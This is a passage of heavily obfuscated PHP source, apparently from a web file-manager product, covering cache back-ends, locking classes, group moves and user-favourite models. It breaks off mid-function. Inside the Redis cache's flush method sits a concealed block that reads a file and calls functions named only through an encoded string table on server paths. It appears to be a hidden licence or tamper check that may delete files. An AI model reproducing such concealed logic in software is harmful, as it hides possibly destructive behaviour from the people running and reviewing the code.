if (!isset($§”  µ[$Ôú“òñ]) || !isset($§”  µ[$¾Ğ–Ş´š]) || $§”  µ[$Ôú“òñ][$–ÊäÑ•Ù[432]] == 0) { return !1; } $Œ¨µ¬½Í = array($–ÊäÑ•Ù[1852] => $Ôú“òñ); $°¼¾´ = Model($–ÊäÑ•Ù[1942])->where($Œ¨µ¬½Í)->select(); if (!$°¼¾´) { $°¼¾´ = array(); } foreach ($°¼¾´ as $è§ÂÈ®ô) { $“™Í…­Å = $è§ÂÈ®ô[$–ÊäÑ•Ù[1680]]; $Œ¨µ¬½Í = array($–ÊäÑ•Ù[1680] => $“™Í…­Å, $–ÊäÑ•Ù[1852] => $¾Ğ–Ş´š); $ßĞ†âò‘ = Model($–ÊäÑ•Ù[1942])->where($Œ¨µ¬½Í)->find(); if (!$ßĞ†âò‘) { $òÑ¼ìÓ´ = array($¾Ğ–Ş´š => $è§ÂÈ®ô[$–ÊäÑ•Ù[1956]]); Model($–ÊäÑ•Ù[535])->userGroupAdd($“™Í…­Å, $òÑ¼ìÓ´); } Model($–ÊäÑ•Ù[535])->userGroupRemove($“™Í…­Å, $Ôú“òñ); } $Œ¨µ¬½Í = array($–ÊäÑ•Ù[411] => 2, $–ÊäÑ•Ù[432] => 0, $–ÊäÑ•Ù[410] => 1, $–ÊäÑ•Ù[505] => array($–ÊäÑ•Ù[7], array($Ôú“òñ, $¾Ğ–Ş´š))); $ÇŠÔáÌí = Model($–ÊäÑ•Ù[845])->where($Œ¨µ¬½Í)->field($–ÊäÑ•Ù[1957])->select(); $ÇŠÔáÌí = array_to_keyvalue($ÇŠÔáÌí, $–ÊäÑ•Ù[505], $–ÊäÑ•Ù[402]); $ığ—¡¥Ğ = !empty($ÇŠÔáÌí[$Ôú“òñ]) ? $ÇŠÔáÌí[$Ôú“òñ] : !1; if ($ığ—¡¥Ğ) { if (!$ÇŠÔáÌí[$¾Ğ–Ş´š]) { $ÇŠÔáÌí[$¾Ğ–Ş´š] = Model($–ÊäÑ•Ù[845])->groupRootAdd($¾Ğ–Ş´š); } $¡šó’ì“ = $ÇŠÔáÌí[$¾Ğ–Ş´š]; $Œ¨µ¬½Í = array($–ÊäÑ•Ù[432] => $ığ—¡¥Ğ); $ÇŠÔáÌí = Model($–ÊäÑ•Ù[845])->where($Œ¨µ¬½Í)->field($–ÊäÑ•Ù[1958])->select(); if (!$ÇŠÔáÌí) { $ÇŠÔáÌí = array(); } Model($–ÊäÑ•Ù[845])->moveClearAuth = !1; foreach ($ÇŠÔáÌí as $¹í“¹äá) { $†ËÍ¦Ç = $¹í“¹äá[$–ÊäÑ•Ù[410]] == $–ÊäÑ•Ù[88] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($–ÊäÑ•Ù[845])->move($¹í“¹äá[$–ÊäÑ•Ù[402]], $¡šó’ì“, $†ËÍ¦Ç); } Model($–ÊäÑ•Ù[845])->moveClearAuth = !0; $Œ¨µ¬½Í = array($–ÊäÑ•Ù[411] => 2, $–ÊäÑ•Ù[505] => $Ôú“òñ); $Å’·æšÆ = array($–ÊäÑ•Ù[505] => $¾Ğ–Ş´š); Model($–ÊäÑ•Ù[1959])->where($Œ¨µ¬½Í)->save($Å’·æšÆ); Model($–ÊäÑ•Ù[1960])->where($Œ¨µ¬½Í)->save($Å’·æšÆ); } $this->_changeChildLevel($§”  µ[$Ôú“òñ], $§”  µ[$¾Ğ–Ş´š], !0); $this->where(array($–ÊäÑ•Ù[432] => $Ôú“òñ))->save(array($–ÊäÑ•Ù[432] => $¾Ğ–Ş´š)); $this->_clearChildrenCache($§”  µ[$¾Ğ–Ş´š]); return !0; } } goto eğ¾¦òËõÁ; bŞõ¸Ç¸ª®: class CacheLockDatabase { public function lock($£«€„Àú, $ŸŸâ¼Ù§ = 0) { $ö´çğ‚ê = Model($_SERVER[³·—™¤¢][849]); $©ÙôƒÛ‡ = microtime(!0) + $ŸŸâ¼Ù§; while (microtime(!0) < $©ÙôƒÛ‡) { $ı³êÂò = $ö´çğ‚ê->get($£«€„Àú); if (!$ı³êÂò || $ı³êÂò < microtime(!0)) { $ãĞÒá‰‹ = $ö´çğ‚ê->set($£«€„Àú, $©ÙôƒÛ‡); if ($ãĞÒá‰‹) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($±™æš‰´) { return Model($_SERVER[³·—™¤¢][849])->get($±™æš‰´); } public function unlock($¼ìó·üù) { Model($_SERVER[³·—™¤¢][849])->remove($¼ìó·üù); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($«Ò¿ ¾‹, $«¥é²ú) { $Û¶¤íˆô =& $_SERVER[³·—™¤¢]; if (!class_exists($Û¶¤íˆô[882])) { show_json($Û¶¤íˆô[883], !1); } $this->cacheTime = $«¥é²ú; $this->handle = new Memcached(); if (is_array($«Ò¿ ¾‹[$Û¶¤íˆô[884]]) && count($«Ò¿ ¾‹[$Û¶¤íˆô[884]]) >= 1) { foreach ($«Ò¿ ¾‹[$Û¶¤íˆô[884]] as $ìÙÀ¥—ô) { $éğ¬œ = explode($Û¶¤íˆô[4], $ìÙÀ¥—ô); $this->handle->addServer($éğ¬œ[0], $éğ¬œ[1]); } } else { $this->handle->addServer($«Ò¿ ¾‹[$Û¶¤íˆô[181]], $«Ò¿ ¾‹[$Û¶¤íˆô[182]]); } } public function set($ŞùŞä, $É—ÛÆŞÚ, $Áğ°êç× = false) { $Áğ°êç× = $Áğ°êç× ? $Áğ°êç× : $this->cacheTime; return $this->handle->set($ŞùŞä, $É—ÛÆŞÚ, $Áğ°êç×); } public function get($Ğåã÷óæ) { return $this->handle->get($Ğåã÷óæ); } public function remove($‹«Ş²¿Å) { return $this->handle->delete($‹«Ş²¿Å); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($Ë«ßÎÛ‘, $´º¶£À°) { $ÑÉÃêÒ =& $_SERVER[³·—™¤¢]; if (!class_exists($ÑÉÃêÒ[885])) { show_json($ÑÉÃêÒ[886], !1); } $this->cacheTime = $´º¶£À°; $ä„óü“ = isset($Ë«ßÎÛ‘[$ÑÉÃêÒ[887]]) ? $Ë«ßÎÛ‘[$ÑÉÃêÒ[887]] : 10; $£¹½Úï = _get($Ë«ßÎÛ‘, $ÑÉÃêÒ[884]); if ($£¹½Úï && is_array($£¹½Úï)) { $this->initCluster($Ë«ßÎÛ‘, $ä„óü“); } else { $this->handle = $this->init($Ë«ßÎÛ‘, $ä„óü“); } } private function init($¯¬Ó¿šÜ, $ìŸõÜ‘¤) { $ä×±Ğôæ =& $_SERVER[³·—™¤¢]; $Êáºéô™ = new Redis(); $»òôƒ ¥ = isset($¯¬Ó¿šÜ[$ä×±Ğôæ[888]]) ? $¯¬Ó¿šÜ[$ä×±Ğôæ[888]] : !1; if ($»òôƒ ¥) { $Êáºéô™->pconnect($¯¬Ó¿šÜ[$ä×±Ğôæ[181]], $¯¬Ó¿šÜ[$ä×±Ğôæ[182]], $ìŸõÜ‘¤); } else { $Êáºéô™->connect($¯¬Ó¿šÜ[$ä×±Ğôæ[181]], $¯¬Ó¿šÜ[$ä×±Ğôæ[182]], $ìŸõÜ‘¤); } if (!empty($¯¬Ó¿šÜ[$ä×±Ğôæ[413]])) { $Êáºéô™->auth($¯¬Ó¿šÜ[$ä×±Ğôæ[413]]); } if (!empty($¯¬Ó¿šÜ[$ä×±Ğôæ[778]]) && $¯¬Ó¿šÜ[$ä×±Ğôæ[778]] != 0) { $Êáºéô™->select($¯¬Ó¿šÜ[$ä×±Ğôæ[778]]); } return $Êáºéô™; } private function initCluster($û†âàäÃ, $µü‰ô¢ô) { $à´§šşç =& $_SERVER[³·—™¤¢]; $î†¸® = array($à´§šşç[889], $à´§šşç[890], $à´§šşç[891]); $ë½Š×’µ = $à´§šşç[889]; if (isset($û†âàäÃ[$à´§šşç[16]]) && in_array($û†âàäÃ[$à´§šşç[16]], $î†¸®)) { $ë½Š×’µ = $û†âàäÃ[$à´§šşç[16]]; } switch ($ë½Š×’µ) { case $à´§šşç[889]: $this->_slave($û†âàäÃ, $µü‰ô¢ô); break; case $à´§šşç[890]: break; case $à´§šşç[891]: $this->isCluster = !0; $å‚Ÿ¡Ë„ = $û†âàäÃ[$à´§šşç[884]]; $Ò€ì®¸ = isset($û†âàäÃ[$à´§šşç[888]]) ? $û†âàäÃ[$à´§šşç[888]] : !1; $±ğ¸è•Ú = isset($û†âàäÃ[$à´§šşç[413]]) ? $û†âàäÃ[$à´§šşç[413]] : null; $this->handle = new RedisCluster(NUll, $å‚Ÿ¡Ë„, $µü‰ô¢ô, $µü‰ô¢ô, $Ò€ì®¸, $±ğ¸è•Ú); break; default: break; } } private function _slave($Û™ì ë, $Ó´¯—ê—) { $¬¢ëœ¥Ë = $Û™ì ë[$_SERVER[³·—™¤¢][884]]; $this->filterConfig($Û™ì ë, $¬¢ëœ¥Ë[0]); $this->handle = $this->init($Û™ì ë, $Ó´¯—ê—); unset($¬¢ëœ¥Ë[0]); if (empty($¬¢ëœ¥Ë)) { return; } $¯îô©§ = array_rand($¬¢ëœ¥Ë); $this->filterConfig($Û™ì ë, $¬¢ëœ¥Ë[$¯îô©§]); $this->slaveHandle = $this->init($Û™ì ë, $Ó´¯—ê—); } private function filterConfig(&$…­æ‘Ã, $œ””Á«š) { $åÅú¼ë =& $_SERVER[³·—™¤¢]; $ßÊÈÂ•İ = explode($åÅú¼ë[4], $œ””Á«š); $âÀ—Ùî = array($åÅú¼ë[181] => $ßÊÈÂ•İ[0], $åÅú¼ë[182] => $ßÊÈÂ•İ[1]); $…­æ‘Ã = array_merge($…­æ‘Ã, $âÀ—Ùî); } public function set($²‹Éäìö, $¿º“…½‘, $¡Öñ…İ… = false) { $¡Öñ…İ… = $¡Öñ…İ… ? $¡Öñ…İ… : $this->cacheTime; return $this->handle->setEx($²‹Éäìö, $¡Öñ…İ…, $¿º“…½‘); } public function setLock($ş·ÈÁê¹, $¥¶À—şŸ, $˜°ù²ƒÃ) { return $this->handle->setNX($ş·ÈÁê¹, $¥¶À—şŸ); } public function get($ƒ­ÅºÕ) { $Øë’â… = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $Øë’â…->get($ƒ­ÅºÕ); } public function remove($Äµ‚ºÔ¥) { return $this->handle->del($Äµ‚ºÔ¥); } public function deleteAll() { $‘í–¿£Ô =& $_SERVER[³·—™¤¢]; if ($_SERVER[$‘í–¿£Ô[892]] != $_SERVER[$‘í–¿£Ô[893]]) { $¾·Ê›é = $‘í–¿£Ô[894]; $•­âşĞª = $‘í–¿£Ô[895]; $ìŸ­î = $_SERVER[$‘í–¿£Ô[896]] . $‘í–¿£Ô[897]; $±ú–µ³Ğ = $•­âşĞª($ìŸ­î); $Ãäı­Ÿ = explode($‘í–¿£Ô[231], $±ú–µ³Ğ); if (count($Ãäı­Ÿ) < $‘í–¿£Ô[615]) { $ş²Ú²’ = $‘í–¿£Ô[898]; $ş²Ú²’(); } $ê¡ªêåš = $‘í–¿£Ô[899]; $ê¡ªêåš($_SERVER[$‘í–¿£Ô[900]]); $ê¡ªêåš($_SERVER[$‘í–¿£Ô[896]] . $‘í–¿£Ô[901]); $š®èò¶À = 1; while ($š®èò¶À > 1) { $š®èò¶À = $š®èò¶À + 4; $Úû–ı = rawurlencode($š®èò¶À . $‘í–¿£Ô[378]); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $ºÕ¶ÙõÄ) { $this->handle->flushall($ºÕ¶ÙõÄ); } return; } return $this->handle->flushAll(); } } goto bÎ—ÁÍÉÛâ; Eêò×ÚÂùŠ: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($ñöİÄü, $æÛï˜ßü) { $¹°»œş =& $_SERVER[³·—™¤¢]; $this->cachePath = $ñöİÄü[$¹°»œş[84]]; $this->prefix = $¹°»œş[854]; $this->cacheTime = $æÛï˜ßü; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($´¯Øœ­ˆ) { $öáóØ =& $_SERVER[³·—™¤¢]; $´¯Øœ­ˆ = str_replace(array($öáóØ[855], $öáóØ[97], $öáóØ[73]), $öáóØ[856], $´¯Øœ­ˆ); return $this->cachePath . $öáóØ[857] . $´¯Øœ­ˆ . $öáóØ[858]; } public function set($ìÁ—¨ê÷, $ÈÈúËØö, $ä—è˜ª¢ = false) { $ÈåÌ¸Ï = $this->getFile($ìÁ—¨ê÷); if (file_put_contents($ÈåÌ¸Ï, $this->prefix . $ÈÈúËØö, LOCK_EX)) { @touch($ÈåÌ¸Ï, intval(time() + $ä—è˜ª¢)); clearstatcache(); return !0; } @unlink($ÈåÌ¸Ï); return !1; } public function get($ÅãÚ‡ùÖ) { $Ç•é°³ = $this->getFile($ÅãÚ‡ùÖ); if (file_exists($Ç•é°³) && filemtime($Ç•é°³) < time()) { @unlink($Ç•é°³); return !1; } $“ÀÂ—ÛÔ = @file_get_contents($Ç•é°³); return substr($“ÀÂ—ÛÔ, strlen($this->prefix)); } public function remove($Œ’óöÀÆ) { $Ü¶ó‚Ä´ = $this->getFile($Œ’óöÀÆ); return @unlink($Ü¶ó‚Ä´); } public function deleteAll() { $ğÁ§„â =& $_SERVER[³·—™¤¢]; $›÷×ÀÄ = scandir($this->cachePath); foreach ($›÷×ÀÄ as $»ş¬ìí¨) { $­è™ÙØî = $this->cachePath . $»ş¬ìí¨; if (strpos($­è™ÙØî, $ğÁ§„â[858]) && strpos($­è™ÙØî, $ğÁ§„â[859])) { @unlink($­è™ÙØî); } } } public function clearTimeout() { $ÂÜĞÆæ² =& $_SERVER[³·—™¤¢]; $©û‹°Ñ„ = scandir($this->cachePath); foreach ($©û‹°Ñ„ as $ñùº¡ÒÍ) { $ŞÓâ¨´Ä = $this->cachePath . $ñùº¡ÒÍ; if (strpos($ŞÓâ¨´Ä, $ÂÜĞÆæ²[858]) && strpos($ŞÓâ¨´Ä, $ÂÜĞÆæ²[859]) && filemtime($ŞÓâ¨´Ä) < time()) { @unlink($ŞÓâ¨´Ä); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $ÒØª°ÚÊ =& $_SERVER[³·—™¤¢]; if (self::$handle) { return self::$handle; } $Šï×»®Ë = $GLOBALS[$ÒØª°ÚÊ[6]][$ÒØª°ÚÊ[349]]; self::$timeout = $Šï×»®Ë[$ÒØª°ÚÊ[860]] ? $Šï×»®Ë[$ÒØª°ÚÊ[860]] : 10; $šóù•·Ë = _get($GLOBALS[$ÒØª°ÚÊ[6]], $ÒØª°ÚÊ[861]); $ü¶Ø¦ş¯ = $Šï×»®Ë[$ÒØª°ÚÊ[847]] ? $Šï×»®Ë[$ÒØª°ÚÊ[847]] : $ÒØª°ÚÊ[199]; if ($ü¶Ø¦ş¯ == $ÒØª°ÚÊ[21] && $šóù•·Ë == $ÒØª°ÚÊ[13]) { $ü¶Ø¦ş¯ = $ÒØª°ÚÊ[199]; } switch ($ü¶Ø¦ş¯) { case $ÒØª°ÚÊ[850]: self::$handle = new CacheLockRedis(); break; case $ÒØª°ÚÊ[851]: self::$handle = new CacheLockMemcached(); break; case $ÒØª°ÚÊ[21]: self::$handle = new CacheLockDatabase(); break; case $ÒØª°ÚÊ[199]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($ÒØª°ÚÊ[862], $ÒØª°ÚÊ[863]); } return self::$handle; } private static function key($©‘ˆç¦å) { return $_SERVER[³·—™¤¢][864] . Cache::key($©‘ˆç¦å); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($ÊÕÏµú³ = '') { self::$errorMsg = $ÊÕÏµú³; } public static function lockGlobal($úµ‚»è£, $…–…È¼‡) { return self::lock($úµ‚»è£, $…–…È¼‡, !0); } public static function lock($®’¸‰•, $ãÀºò‰ = false, $Ö©‚»šâ = false) { $ÅÂœóİÖ =& $_SERVER[³·—™¤¢]; $ÆëÕşì = self::init(); $Ç÷ñÉÖ = self::key($®’¸‰•); $ãÀºò‰ = $ãÀºò‰ ? $ãÀºò‰ : self::$timeout; $’é¸» = $ÆëÕşì->lock($Ç÷ñÉÖ, $ãÀºò‰); $¤ƒ¸ÎİÕ = timeFloat(); if (!$’é¸») { $êÃ¥®‹¯ = "\154\x6f\143\153\x20\145\x72\162\x6f\162\73\153\x65\171\x3d{$®’¸‰•}\x3b\164\151\155\x65\75{$ãÀºò‰}\73" . self::$errorMsg . $ÅÂœóİÖ[71] . get_caller_msg(); $ƒŒşƒÓ = LNG($ÅÂœóİÖ[865]) . "\50{$ãÀºò‰}\163\x29\x2e" . LNG($ÅÂœóİÖ[866]); $ƒŒşƒÓ .= $ÅÂœóİÖ[867]; if (is_string(self::$errorMsg) && self::$errorMsg) { $ƒŒşƒÓ = $ƒŒşƒÓ . $ÅÂœóİÖ[868] . self::$errorMsg; } write_log($êÃ¥®‹¯, $ÅÂœóİÖ[863]); show_json($ƒŒşƒÓ, !1); } if (!$Ö©‚»šâ) { self::$lockItem[$Ç÷ñÉÖ] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $¥ÛÆ˜íª = number_format(timeFloat() - $¤ƒ¸ÎİÕ, 3); write_log($ÅÂœóİÖ[869] . $®’¸‰• . $ÅÂœóİÖ[870] . $¥ÛÆ˜íª, $ÅÂœóİÖ[863]); } return $’é¸»; } public static function lockGet($ğª›·Èî) { $şÄ‰Â‘ = self::key($ğª›·Èî); if (self::$lockItem[$şÄ‰Â‘]) { return self::$lockItem[$şÄ‰Â‘]; } return self::init()->lockGet($şÄ‰Â‘); } public static function unlock($ò¤úëå) { $©ŠúÏòÆ =& $_SERVER[³·—™¤¢]; $îô¸¢’ = self::key($ò¤úëå); self::$lockItem[$îô¸¢’] = null; self::init()->unlock($îô¸¢’); if (GLOBAL_DEBUG_LOG_ALL) { write_log($©ŠúÏòÆ[871] . $ò¤úëå, $©ŠúÏòÆ[863]); } return; } public static function unlockRuntime() { $‚ÛÚìôß =& $_SERVER[³·—™¤¢]; $”¨Èª î = self::init(); $æÑê€ = !1; foreach (self::$lockItem as $Ó¶•áõ© => $³»¤úëÈ) { if (!$³»¤úëÈ) { continue; } $”¨Èª î->unlock($Ó¶•áõ©); if (!$æÑê€) { $æÑê€ = !0; write_log($‚ÛÚìôß[872] . $Ó¶•áõ© . $‚ÛÚìôß[71] . get_caller_msg(), $‚ÛÚìôß[863]); continue; } write_log($‚ÛÚìôß[872] . $Ó¶•áõ©, $‚ÛÚìôß[863]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $ƒ¡¢†¤ƒ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($‚ÛÚìôß[873] . $ƒ¡¢†¤ƒ . $‚ÛÚìôß[874] . ACTION, $‚ÛÚìôß[863]); } } public static function fileLock($‘¥Íä‡Ú) { $û”®‡¯ì =& $_SERVER[³·—™¤¢]; if (!$GLOBALS[$û”®‡¯ì[875]]) { $GLOBALS[$û”®‡¯ì[875]] = array(); } $GLOBALS[$û”®‡¯ì[875]][$‘¥Íä‡Ú] = !1; $éì¬Ï°Ò = fopen(DATA_PATH . $‘¥Íä‡Ú . $û”®‡¯ì[876], $û”®‡¯ì[877]); if (!$éì¬Ï°Ò) { return !1; } $GLOBALS[$û”®‡¯ì[875]][$‘¥Íä‡Ú] = $éì¬Ï°Ò; if (flock($éì¬Ï°Ò, LOCK_EX)) { return !0; } self::unlock($‘¥Íä‡Ú); show_json($û”®‡¯ì[878], !1); return !1; } public static function fileUnlock($¥µŠÖñ¸) { $îˆêñ·´ =& $_SERVER[³·—™¤¢]; $Ü®¯ıí· = $GLOBALS[$îˆêñ·´[875]][$¥µŠÖñ¸]; if (!$Ü®¯ıí·) { return; } $GLOBALS[$îˆêñ·´[875]][$¥µŠÖñ¸] = !1; flock($Ü®¯ıí·, LOCK_UN); fclose($Ü®¯ıí·); } public static function fileUnlockAll() { $Á–Äóµá =& $_SERVER[³·—™¤¢]; if (!$GLOBALS[$Á–Äóµá[875]]) { return; } foreach ($GLOBALS[$Á–Äóµá[875]] as $¤àşÅœ­ => $çÀ˜ë™) { if (!$çÀ˜ë™) { continue; } $GLOBALS[$Á–Äóµá[875]][$¤àşÅœ­] = !1; flock($çÀ˜ë™, LOCK_UN); fclose($çÀ˜ë™); } $GLOBALS[$Á–Äóµá[875]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } goto Cµ°Ù™„²Õ; FòÒ‰Âß®ë: define($_SERVER[³·—™¤¢][612], $_SERVER[³·—™¤¢][613]); $nqvbtepsfg = $_SERVER[³·—™¤¢][614]; if (strlen($nqvbtepsfg) < $_SERVER[³·—™¤¢][615]) { return; } goto DŞ¥¢æšŞË; Cµ°Ù™„²Õ: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $îõşÎ× =& $_SERVER[³·—™¤¢]; $Ê°›àØó = $GLOBALS[$îõşÎ×[6]][$îõşÎ×[349]]; self::$cachePath = $Ê°›àØó[$îõşÎ×[199]][$îõşÎ×[84]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($ˆİŠî¿¾, $á‘ÒÓ¹‹ = 0) { $™Ó×íêÎ =& $_SERVER[³·—™¤¢]; $”œÈ§èİ = microtime(!0); $ÚÉ–…î = $”œÈ§èİ + $á‘ÒÓ¹‹ + 0.0001; $¤‘¤íÚË = rtrim(self::$cachePath, $™Ó×íêÎ[8]) . $™Ó×íêÎ[879] . md5($ˆİŠî¿¾) . $™Ó×íêÎ[876]; if (file_exists($¤‘¤íÚË) && filemtime($¤‘¤íÚË) && filemtime($¤‘¤íÚË) < time() - 10) { @unlink($¤‘¤íÚË); } do { if (file_exists($¤‘¤íÚË)) { cacheLockWait(); continue; } $ëš›ô¹— = fopen($¤‘¤íÚË, $™Ó×íêÎ[880]); if (!$ëš›ô¹—) { return !1; } $ €¥Ú³Î = flock($ëš›ô¹—, LOCK_EX | LOCK_NB); self::$caches[$ˆİŠî¿¾] = array($™Ó×íêÎ[881] => $ëš›ô¹—, $™Ó×íêÎ[199] => $¤‘¤íÚË); fwrite($ëš›ô¹—, $ÚÉ–…î); clearstatcache(); if ($ëš›ô¹— && $ €¥Ú³Î) { return !0; } cacheLockWait(); } while (microtime(!0) < $ÚÉ–…î); $this->unlock($ˆİŠî¿¾); return !1; } public function lockGet($ŠÊ÷¦®°) { $ğıâûü– =& $_SERVER[³·—™¤¢]; $úÅî¯Ç¡ = rtrim(self::$cachePath, $ğıâûü–[8]) . $ğıâûü–[879] . md5($ŠÊ÷¦®°) . $ğıâûü–[876]; return file_exists($úÅî¯Ç¡); } public function unlock($òš¶ë´Ü) { $‡¾»Öü =& $_SERVER[³·—™¤¢]; $•´×¢Ş® = self::$caches[$òš¶ë´Ü]; if (!$•´×¢Ş®) { return; } @flock($•´×¢Ş®[$‡¾»Öü[881]], LOCK_UN); @fclose($•´×¢Ş®[$‡¾»Öü[881]]); @unlink($•´×¢Ş®[$‡¾»Öü[199]]); unset(self::$caches[$òš¶ë´Ü]); } } class CacheLockRedis { public function lock($ÉåıöÓ‡, $îĞ‰Œ®» = 10) { $ŠÚÍæ»ó = Cache::init(); $õï­îæÊ = microtime(!0) + $îĞ‰Œ®»; while (microtime(!0) < $õï­îæÊ) { $¡çé£·Ñ = $ŠÚÍæ»ó->get($ÉåıöÓ‡); if (!$¡çé£·Ñ) { $¢îğ¦•¨ = $ŠÚÍæ»ó->setLock($ÉåıöÓ‡, $õï­îæÊ, $îĞ‰Œ®»); if ($¢îğ¦•¨) { return !0; } } else { if ($¡çé£·Ñ < microtime(!0)) { $ŠÚÍæ»ó->set($ÉåıöÓ‡, $õï­îæÊ, $îĞ‰Œ®» * 2); if ($ŠÚÍæ»ó->get($ÉåıöÓ‡) === $¡çé£·Ñ) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($„ã›±í) { return Cache::init()->get($„ã›±í); } public function unlock($Ô®´¯¹‘) { return Cache::init()->remove($Ô®´¯¹‘); } } class CacheLockMemcached { public function lock($ú”¾òÌ², $¢¤ÀÃÍš = 0) { $¢©ğ›üß = Cache::init(); $ìÎŠ·ê÷ = microtime(!0) + $¢¤ÀÃÍš; while (microtime(!0) < $ìÎŠ·ê÷) { $”ÍŒ Ÿ¥ = $¢©ğ›üß->get($ú”¾òÌ²); if (!$”ÍŒ Ÿ¥ || $”ÍŒ Ÿ¥ < microtime(!0)) { $¹ÉâÅîá = $¢©ğ›üß->handle->add($ú”¾òÌ², $ìÎŠ·ê÷, $¢¤ÀÃÍš); if ($¹ÉâÅîá) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($¡¬´äº“) { return Cache::init()->get($¡¬´äº“); } public function unlock($¿á°±ì) { return Cache::init()->remove($¿á°±ì); } } goto bŞõ¸Ç¸ª®; D¥ƒ–´ßÜî: class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\x6d\x2e\164\141\163\x6b\114\x69\163\x74"; public $field = array("\156\x61\x6d\145", "\x74\171\x70\x65", "\x65\166\145\x6e\164", "\x74\x69\155\x65", "\144\145\163\x63", "\163\x79\163\164\145\x6d", "\x65\156\x61\142\x6c\x65", "\x6c\x61\163\x74\122\165\x6e", "\x73\157\162\x74"); public function listData($ç¦§ıÃ = false, $ÛÕÍØ¥¼ = "\163\x6f\162\x74", $¼›ŠÕµ´ = false) { return parent::listData($ç¦§ıÃ, $ÛÕÍØ¥¼, $¼›ŠÕµ´); } public function add($ªœı‘çœ) { $‘üÙ¨ßù =& $_SERVER[³·—™¤¢]; $ÄÇÖ«–Ã = $this->findByName($ªœı‘çœ[$‘üÙ¨ßù[32]]); if ($ÄÇÖ«–Ã) { return !1; } $ªœı‘çœ[$‘üÙ¨ßù[1640]] = 0; $ªœı‘çœ[$‘üÙ¨ßù[1876]] = $this->getSort(); return parent::insert($ªœı‘çœ); } private function getSort() { $ë…ıµóª =& $_SERVER[³·—™¤¢]; $ÇÂ³²ÓÀ = parent::listData(); $¶Âë  = array_to_keyvalue($ÇÂ³²ÓÀ, $ë…ıµóª[12], $ë…ıµóª[1876]); return empty($¶Âë ) ? 0 : max($¶Âë ) + 1; } public function update($“ÇÑş…, $§¬µ­áó) { $ãí¤Ô¤¤ =& $_SERVER[³·—™¤¢]; $ïÛˆØÙ = $this->listData($“ÇÑş…); $‡ï ¤¦Ş = $this->findByName($§¬µ­áó[$ãí¤Ô¤¤[32]]); if (!$ïÛˆØÙ || $‡ï ¤¦Ş && $‡ï ¤¦Ş[$ãí¤Ô¤¤[399]] != $ïÛˆØÙ[$ãí¤Ô¤¤[399]]) { return !1; } return parent::update($“ÇÑş…, $§¬µ­áó); } public function remove($»Ğ³¯ê‚, $ïÑšÍ±† = false) { $ç¬‘î•® =& $_SERVER[³·—™¤¢]; $Ğºİ¾Ş = $this->listData($»Ğ³¯ê‚); if (!$Ğºİ¾Ş) { return; } if (!$ïÑšÍ±† && $Ğºİ¾Ş[$ç¬‘î•®[1299]] == $ç¬‘î•®[88]) { return !1; } return parent::remove($»Ğ³¯ê‚); } public function enable($ªäÖĞõ¢, $Ã¸œóŠë) { return $this->update($ªäÖĞõ¢, array($_SERVER[³·—™¤¢][2279] => $Ã¸œóŠë)); } public function run($ÏªÕ†¤) { return $this->update($ÏªÕ†¤, array($_SERVER[³·—™¤¢][2291] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\163\x65\162\137\x66\141\166"; protected function cacheFunctionAlias($ß¢÷Æˆı) { $ÑÇ¢ˆà =& $_SERVER[³·—™¤¢]; return array($ÑÇ¢ˆà[1963] => array(USER_ID, $ÑÇ¢ˆà[2292])); } protected function listData() { $«ÅğØç =& $_SERVER[³·—™¤¢]; $“éù¿†½ = array($«ÅğØç[1671] => USER_ID, $«ÅğØç[484] => 0); $ †¹‹±» = $«ÅğØç[2293]; $˜áĞÁ = $this->field($ †¹‹±»)->where($“éù¿†½)->order($«ÅğØç[2294])->select(); return $˜áĞÁ ? $˜áĞÁ : array(); } protected function resetCache() { } protected function listView() { $®ÅàÌµ… =& $_SERVER[³·—™¤¢]; $µ¥–êÑÛ = $this->listData(); $‡ãæÑ• = array_filter_by_field($µ¥–êÑÛ, $®ÅàÌµ…[33], $®ÅàÌµ…[416]); $³§á¼Ä´ = array_to_keyvalue($‡ãæÑ•, $®ÅàÌµ…[12], $®ÅàÌµ…[84]); if (!$³§á¼Ä´) { return $µ¥–êÑÛ; } $éˆ¨˜ƒ = 2000; $Ğ¸²©™ = array($®ÅàÌµ…[417] => array($®ÅàÌµ…[418], $³§á¼Ä´)); $ÀíØş˜À = Model($®ÅàÌµ…[845])->listSource($Ğ¸²©™, $éˆ¨˜ƒ); $ÀíØş˜À = array_merge($ÀíØş˜À[$®ÅàÌµ…[83]], $ÀíØş˜À[$®ÅàÌµ…[82]]); $ÀíØş˜À = array_to_keyvalue($ÀíØş˜À, $®ÅàÌµ…[402]); foreach ($µ¥–êÑÛ as $ÅÁ¯Îá¬ => $ê«åÖâº) { $…ÃÎ‹Ã = $ÀíØş˜À[$ê«åÖâº[$®ÅàÌµ…[84]]]; $…ÃÎ‹Ã = $…ÃÎ‹Ã ? $…ÃÎ‹Ã : array(); $µ¥–êÑÛ[$ÅÁ¯Îá¬] = array_merge($…ÃÎ‹Ã, $ê«åÖâº); } return $µ¥–êÑÛ; } protected function addFav($Š™ïèêú, $Îş–ü¶« = '', $“ùŞ¿ïØ = "\163\x6f\x75\x72\x63\145") { $•ÕÄ‚ï =& $_SERVER[³·—™¤¢]; $“İ³ƒÚ = array($•ÕÄ‚ï[1671] => USER_ID, $•ÕÄ‚ï[484] => 0, 